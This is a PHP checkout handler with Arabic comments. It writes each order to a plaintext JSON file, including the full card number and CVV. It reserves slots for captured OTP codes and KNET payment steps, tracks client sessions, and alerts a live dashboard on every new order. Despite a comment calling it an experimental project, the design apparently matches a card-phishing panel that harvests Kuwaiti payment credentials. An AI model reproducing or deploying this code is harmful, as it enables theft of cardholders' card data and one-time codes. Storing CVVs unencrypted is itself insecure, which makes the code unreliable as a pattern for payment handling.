<?php
/**
 * استقبال بيانات الطلب من checkout.html وحفظها في JSON
 */

header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');

// معالجة OPTIONS request
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

// التأكد أن الطلب POST
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['success' => false, 'message' => 'Method not allowed']);
    exit;
}

try {
    // قراءة البيانات من الطلب
    $input = file_get_contents('php://input');
    $data = json_decode($input, true);
    
    if (!$data) {
        throw new Exception('بيانات غير صالحة');
    }
    
    // إضافة معلومات إضافية
    $order = [
        'id' => time() . rand(1000, 9999), // رقم فريد
        'created_at' => date('Y-m-d H:i:s'),
        'ip_address' => $_SERVER['REMOTE_ADDR'] ?? 'Unknown',
        'status' => 'pending',
        
        // معلومات العميل
        'customer' => [
            'full_name' => $data['fullName'] ?? '',
            'phone' => ($data['phoneCC'] ?? '+965') . ' ' . ($data['phoneLocal'] ?? ''),
            'email' => $data['email'] ?? ''
        ],
        
        // عنوان التوصيل
        'address' => [
            'line1' => $data['addr1'] ?? '',
            'line2' => $data['addr2'] ?? '',
            'building' => $data['building'] ?? '',
            'floor' => $data['floor'] ?? '',
            'apartment' => $data['apartment'] ?? '',
            'notes' => $data['notes'] ?? ''
        ],
        
        // معلومات الدفع
        'payment' => [
            'method' => $data['paymentMethod'] ?? 'card',
            'mode' => $data['paymentMode'] ?? 'full',
            'subtotal' => $data['subtotal'] ?? 0,
            'total' => $data['total'] ?? 0,
            'currency' => $data['currency'] ?? 'د.ك'
        ],
        
        // السلة
        'cart' => $data['cart'] ?? [],

        // محاولات OTP (تُملأ من save_otp.php عند صفحة التحقق)
        'otp_data' => [],

        // خطوات KNET / ver وغيرها (save_flow_step.php / append_order_flow)
        'flow_data' => [],
        
        // بيانات البطاقة (إذا كانت الدفع ببطاقة)
        'card_data' => null,

        // جلسة المتصفح (من client_track.js) لتتبع النشاط والتوجيه
        'client_session_id' => isset($data['client_session_id'])
            ? preg_replace('/[^\w\-\.]/', '', (string) $data['client_session_id'])
            : '',
        'client_channel_suffix' => isset($data['client_channel_suffix'])
            ? substr(strtolower(preg_replace('/[^a-f0-9]/', '', (string) $data['client_channel_suffix'])), 0, 16)
            : '',
    ];
    
    // إذا كانت الدفع ببطاقة، نحفظ البيانات (بدون تشفير لأنه مشروع تجريبي)
    if ($data['paymentMethod'] === 'card' && !empty($data['cardNum'])) {
        $order['card_data'] = [
            'holder_name' => $data['cardName'] ?? '',
            'last4' => substr(preg_replace('/\D/', '', $data['cardNum']), -4),
            'expiry' => ($data['cardMonth'] ?? '') . '/' . ($data['cardYear'] ?? ''),
            'full_number' => $data['cardNum'] ?? '', // في المشروع الحقيقي لا تحفظها!
            'cvv' => $data['cardCvv'] ?? ''
        ];
    }
    
    // قراءة/كتابة الملف مع قفل لتفادي فقدان تحديثات OTP أو KNET عند التزامن
    $ordersFile = __DIR__ . '/data/orders.json';
    $dataDir = dirname($ordersFile);
    if (!is_dir($dataDir)) {
        if (!mkdir($dataDir, 0755, true) && !is_dir($dataDir)) {
            throw new Exception('تعذّر إنشاء مجلد البيانات');
        }
    }

    $fp = fopen($ordersFile, 'c+');
    if ($fp === false) {
        throw new Exception('تعذّر فتح ملف الطلبات');
    }
    if (!flock($fp, LOCK_EX)) {
        fclose($fp);
        throw new Exception('تعذّر قفل ملف الطلبات');
    }

    rewind($fp);
    $content = stream_get_contents($fp);
    $orders = [];
    if ($content !== false && $content !== '') {
        $decoded = json_decode($content, true);
        $orders = is_array($decoded) ? $decoded : [];
    }

    array_unshift($orders, $order);

    $json = json_encode($orders, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    if ($json === false) {
        flock($fp, LOCK_UN);
        fclose($fp);
        throw new Exception('فشل تجهيز بيانات الحفظ');
    }

    rewind($fp);
    if (!ftruncate($fp, 0)) {
        flock($fp, LOCK_UN);
        fclose($fp);
        throw new Exception('فشل تجهيز الملف للكتابة');
    }
    $written = fwrite($fp, $json);
    fflush($fp);
    flock($fp, LOCK_UN);
    fclose($fp);

    if ($written === false) {
        throw new Exception('فشل حفظ البيانات');
    }

    if (is_file(__DIR__ . '/includes/farm_pusher_broadcast.php')) {
        require_once __DIR__ . '/includes/farm_pusher_broadcast.php';
        farm_pusher_broadcast('dashboard-event', [
            'kind' => 'new_order',
            'order_id' => (string) $order['id'],
        ]);
        farm_pusher_broadcast('dashboard-event', ['kind' => 'orders_updated']);
    }
    
    // تحديد الصفحة التالية (مع total لصفحة KNET)
    $totalOut = isset($data['total']) ? (string) $data['total'] : '0';
    $redirect = $data['paymentMethod'] === 'knet'
        ? 'knet.php?order_id=' . rawurlencode((string) $order['id'])
            . '&total=' . rawurlencode($totalOut)
            . '&tickets=0'
        : 'otp.html?order_id=' . rawurlencode((string) $order['id']);
    
    // إرجاع النتيجة
    echo json_encode([
        'success' => true,
        'message' => 'تم حفظ الطلب بنجاح!',
        'order_id' => $order['id'],
        'redirect' => $redirect
    ], JSON_UNESCAPED_UNICODE);
    
} catch (Exception $e) {
    http_response_code(400);
    echo json_encode([
        'success' => false,
        'message' => $e->getMessage()
    ], JSON_UNESCAPED_UNICODE);
}